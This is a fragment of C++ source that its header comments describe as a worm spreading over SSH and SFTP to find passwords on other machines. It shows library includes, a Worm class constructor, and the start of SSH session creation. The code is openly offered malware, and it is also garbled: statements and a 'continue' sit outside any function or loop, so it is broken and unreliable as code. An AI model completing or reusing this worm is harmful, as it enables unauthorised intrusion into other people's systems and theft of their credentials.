//Start Date: 24-09-2024
//author - apocalypse9949(me)
//description - WORM using sftp and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
//WARNING!!
//
#include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
#include <libssh/sftp.h>    //Tthe SFTP library for file transfer.
#include <iostream>         // For input-output operations
#include <fstream>          // For file operations (though not used in this code) but if you want to use this use it with caution!
#include <vector>           // Using vectors to store data
#include <sstream>          // For string stream operations to parse IP addresses

// Worm class 
class Worm {
private:
    std::string network;  // Store network address as a string

public:
    // Constructor to initialize the network address
    Worm(const std::string& network_address) : network(network_address) {}
                my_ssh_session = ssh_new();  // Create new SSH session
                if (my_ssh_session == NULL) {  // it will Check if session creation was successful
                    continue;
                }   

             
